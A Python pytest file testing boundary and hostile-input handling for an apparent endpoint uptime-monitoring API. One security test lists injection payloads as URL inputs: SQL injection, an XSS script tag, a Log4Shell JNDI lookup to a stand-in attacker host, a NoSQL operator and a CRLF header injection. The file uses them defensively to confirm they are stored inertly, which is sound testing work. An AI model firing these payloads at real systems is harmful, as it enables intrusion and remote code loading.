"""Boundaries and hostile input through the real handlers (moto behind them)."""

import json
from datetime import UTC, datetime, timedelta

import pytest

import get_checks
import register_endpoint
from common.repo import Repo
from common.status import CheckResult
from common.urlguard import UnresolvableHost

pytestmark = pytest.mark.req("VW-001", "VW-002", "VW-003", "VW-007", "VW-008")

NOW = datetime(2026, 10, 2, 12, 0, 0, tzinfo=UTC)


@pytest.fixture(autouse=True)
def fakes(tables, monkeypatch):
    def resolver(host):
        if host.endswith("example.com"):
            return ["93.184.215.14"]
        raise UnresolvableHost(host)

    monkeypatch.setattr(register_endpoint, "resolver", resolver)
    monkeypatch.setattr(register_endpoint, "probe", lambda url, **_: CheckResult(200, 10.0))
    monkeypatch.setattr(register_endpoint, "utcnow", lambda: NOW)
    monkeypatch.setattr(get_checks, "utcnow", lambda: NOW)
    monkeypatch.delenv("MAX_ENDPOINTS", raising=False)


def register(body):
    payload = body if isinstance(body, str) else json.dumps(body)
    response = register_endpoint.lambda_handler({"version": "2.0", "body": payload}, None)
    return response["statusCode"], json.loads(response["body"])


def check(url):
    response = get_checks.lambda_handler({"queryStringParameters": {"url": url}}, None)
    return response["statusCode"], json.loads(response["body"])


@pytest.mark.boundary
@pytest.mark.parametrize(
    "status, accepted",
    [(99, False), (100, True), (200, True), (599, True), (600, False), (-1, False), (0, False)],
)
def test_expected_status_boundary(status, accepted):
    code, _ = register({"url": "https://example.com/", "expected_status": status})
    assert code == (201 if accepted else 400)


@pytest.mark.negative
@pytest.mark.parametrize("value", ["200", 200.5, True, False, None, [], {}])
def test_expected_status_of_the_wrong_type_is_rejected(value):
    code, body = register({"url": "https://example.com/", "expected_status": value})
    assert (code, body["code"]) == (400, "bad_request")


@pytest.mark.boundary
@pytest.mark.parametrize("length, expected", [(2047, 201), (2048, 201), (2049, 400)])
def test_url_length_boundary_through_the_api(length, expected):
    base = "https://example.com/"
    code, _ = register({"url": base + "a" * (length - len(base))})
    assert code == expected


@pytest.mark.boundary
def test_endpoint_cap_boundary_n_minus_1_n_and_n_plus_1(monkeypatch):
    monkeypatch.setenv("MAX_ENDPOINTS", "3")
    codes = [register({"url": f"https://h{i}.example.com/"})[0] for i in range(4)]
    assert codes == [201, 201, 201, 429]
    assert Repo().count_endpoints() == 3
    assert register({"url": "https://h0.example.com/"})[0] == 200, "existing URLs still succeed"


@pytest.mark.security
@pytest.mark.parametrize(
    "url",
    [
        "https://example.com/?q=' OR '1'='1",
        "https://example.com/<script>alert(1)</script>",
        "https://example.com/${jndi:ldap://attacker/x}",
        'https://example.com/?f={"$ne": null}',
        "https://example.com/%00%0d%0aSet-Cookie:x=1",
        "https://example.com/ü/日本語",
    ],
)
def test_hostile_looking_urls_are_stored_as_inert_data(url):
    code, created = register({"url": url})
    assert code == 201
    code, fetched = check(url)
    assert code == 200
    assert fetched["endpoint_id"] == created["endpoint_id"]
    assert Repo().count_endpoints() == 1


@pytest.mark.security
@pytest.mark.negative
def test_a_megabyte_url_is_refused_and_nothing_is_stored():
    code, body = register({"url": "https://example.com/" + "a" * 1_000_000})
    assert (code, body["code"]) == (400, "unsafe_url")
    assert Repo().count_endpoints() == 0


@pytest.mark.negative
@pytest.mark.parametrize("url", ["a,b", "https://example.com/,https://example.org/", "   "])
def test_lookup_of_malformed_or_joined_urls_is_a_client_error(url):
    code, _ = check(url)
    assert code in (400, 404)


@pytest.mark.boundary
@pytest.mark.parametrize("count, shown", [(0, 0), (1, 1), (19, 19), (20, 20), (21, 20)])
def test_recent_latency_window_is_capped_at_twenty(count, shown):
    register({"url": "https://example.com/"})
    repo = Repo()
    ident = register({"url": "https://example.com/"})[1]["endpoint_id"]
    repo.history.delete_item(Key={"endpoint_id": ident, "sk": f"C#{NOW:%Y-%m-%dT%H:%M:%SZ}"})
    for i in range(count):
        repo.record_check(ident, NOW + timedelta(minutes=5 * (i + 1)), "UP", 200, 10.0)
    assert len(check("https://example.com/")[1]["recent_latencies"]) == shown


@pytest.mark.boundary
def test_uptime_window_includes_day_29_and_excludes_day_30():
    repo = Repo()
    repo.record_check("e", NOW - timedelta(days=30), "DOWN", 500, 10.0)
    assert repo.uptime_30d("e", NOW) is None, "day 30 is outside the 30-day window"
    repo.record_check("e", NOW - timedelta(days=29), "UP", 200, 10.0)
    assert repo.uptime_30d("e", NOW) == 100.0, "day 29 is inside the window"
